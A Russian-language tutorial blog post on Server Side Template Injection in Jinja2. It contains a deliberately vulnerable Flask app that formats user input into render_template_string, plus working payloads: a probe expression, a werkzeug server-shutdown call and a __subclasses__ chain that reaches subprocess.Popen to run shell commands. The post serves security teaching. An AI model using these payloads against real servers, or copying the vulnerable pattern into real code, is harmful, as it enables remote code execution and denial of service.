---
published: true
title: Server Side Template Injection (SSTI) в Jinja
---

Jinja это шаблонизатор для Python приложений, таких как Django и Flask. Шаблонизатор в модели mvc отвечает за представление (view).
Он генерирует HTML на основе статических шаблонов динамически добавляя в них элементы.
Иньекция позволяет атакующему выпонить вредоносный код в шаблоне.

###### Встроеные функции Jinja
* `{% raw %}{{var}} {% endraw %}` - переменная
* `{% raw %}{% condition %}{% endraw %}` - выражение
* ...

###### Пример приложение с уязвимостью
Для примера создадим Flask приложение с уязвимостью.
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.route('/')
def flask_ssti():
    name = "World"
    if request.args.get('name'):
        name = request.args.get('name')
    template = '''
        <!doctype html>
        <h1>Hello %s!</h1>
        <form>
            <input type="text" name="name">
        </form>
    ''' % (name)
    return render_template_string(template)


if __name__ == "__main__":
    app.run(debug=True)
```

###### Пример атаки
Попробуем подставить в уязвимый параметр выражение `{%raw%}{{1+1}}{%endraw%}`

![ssti1](/images/ssti1.png)

###### К чему мы получаем доступ
* к объекту `request`
* к объекту `config`
* к переменным jinja


###### Остановка сервера
В случае если мы используем werkzeug следующий payload приведет к остановке сервера
```console
{% raw %}{{ request.environ['werkzeug.server.shutdown']() }} {% endraw %}
```

###### Remote Code Execution

```python
{% raw %}{{ ''.__class__.__mro__}} # find <class 'object'>
{{ ''.__class__.__mro__[1].__subclasses__()}} # find <class 'subprocess.Popen'>
{{ ''.__class__.__mro__[1].__subclasses__()[282]('touch /tmp/rce',shell=True) }}{% endraw %}
```

![ssti2](/images/ssti2.png)

##### Links
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
* [https://0day.work/jinja2-template-injection-filter-bypasses/](https://0day.work/jinja2-template-injection-filter-bypasses/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* [https://nvisium.com/blog/2015/12/07/injecting-flask.html](https://nvisium.com/blog/2015/12/07/injecting-flask.html)
* [http://jinja.pocoo.org/](http://jinja.pocoo.org/)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)